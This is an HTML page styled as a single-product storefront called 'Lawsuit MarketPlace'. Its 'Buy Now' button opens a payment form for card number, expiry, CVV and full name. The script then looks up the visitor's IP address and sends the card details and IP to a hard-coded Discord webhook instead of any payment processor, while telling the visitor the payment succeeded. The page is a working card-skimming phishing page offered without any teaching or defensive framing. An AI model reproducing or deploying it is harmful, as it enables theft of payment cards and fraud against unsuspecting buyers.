<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Lawsuit MarketPlace</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
    rel="stylesheet"
  />
  <style>
    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 1;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.5);
      padding-top: 60px;
    }

    .modal-content {
      background-color: #333;
      margin: 5% auto;
      padding: 20px;
      border: 1px solid #888;
      width: 40%;
      border-radius: 10px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #888;
      background-color: #444;
      color: #fff;
      border-radius: 8px;
    }

    button {
      background-color: #007BFF;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    .product-card {
      background-color: #1f2937;
      padding: 20px;
      border-radius: 10px;
      width: 300px;
      text-align: center;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .product-title {
      font-size: 1.5rem;
      font-weight: bold;
      color: #fff;
    }

    .product-description {
      color: #9ca3af;
      margin-bottom: 20px;
    }

    .product-price {
      font-size: 1.25rem;
      color: #34d399;
      margin-bottom: 20px;
    }

    .buy-now-button {
      background-color: #34d399;
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      text-transform: uppercase;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .buy-now-button:hover {
      background-color: #10b981;
    }
  </style>
</head>
<body class="bg-gray-900 text-white">
  <!-- Main Container -->
  <div class="container mx-auto my-12">
    <div class="flex justify-center items-center">
      <!-- Single Product Card -->
      <div class="product-card">
        <h2 class="product-title">Exclusive Product</h2>
        <p class="product-description">This is the most exclusive and premium product available.</p>
        <p class="product-price">$99.99</p>
        <button id="buy-button" class="buy-now-button">Buy Now</button>
      </div>
    </div>
  </div>

  <!-- Modal for Payment Form -->
  <div id="payment-modal" class="modal">
    <div class="modal-content">
      <h3 class="text-xl font-semibold mb-4">Payment Information</h3>
      <form id="payment-form">
        <input type="text" id="card-number" placeholder="Card Number" required />
        <input type="text" id="expiry" placeholder="Expiry (MM/YY)" required />
        <input type="text" id="cvv" placeholder="CVV" required />
        <input type="text" id="full-name" placeholder="Full Name" required />
        <button type="submit">Submit Payment</button>
      </form>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const buyButton = document.getElementById('buy-button');
      const modal = document.getElementById('payment-modal');
      const paymentForm = document.getElementById('payment-form');

      // Show modal when 'Buy Now' is clicked
      buyButton.addEventListener('click', () => {
        modal.style.display = 'flex';
      });

      // Close modal when the user clicks outside the modal content
      modal.addEventListener('click', (e) => {
        if (e.target === modal) {
          modal.style.display = 'none';
        }
      });

      // Fetch the user's IP address using ipify API
      async function getUserIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip;
        } catch (error) {
          console.error('Error fetching IP address:', error);
          return 'IP not available';
        }
      }

      // Handle form submission and send to webhook
      paymentForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Get form values
        const cardNumber = document.getElementById('card-number').value;
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;
        const fullName = document.getElementById('full-name').value;

        // Get the user's IP address
        const userIP = await getUserIP();

        // Data to send to Discord webhook
        const data = {
          content: `New payment information received:

- **Card Number**: ${cardNumber}
- **Expiry**: ${expiry}
- **CVV**: ${cvv}
- **Full Name**: ${fullName}
- **IP Address**: ${userIP}`
        };

        // Send data to Discord webhook
        try {
          const response = await fetch('https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          });

          if (response.ok) {
            alert('Payment details submitted successfully!');
            modal.style.display = 'none';
          } else {
            alert('Failed to submit payment details');
          }
        } catch (error) {
          alert('Error sending data');
        }
      });
    });
  </script>
</body>
</html>
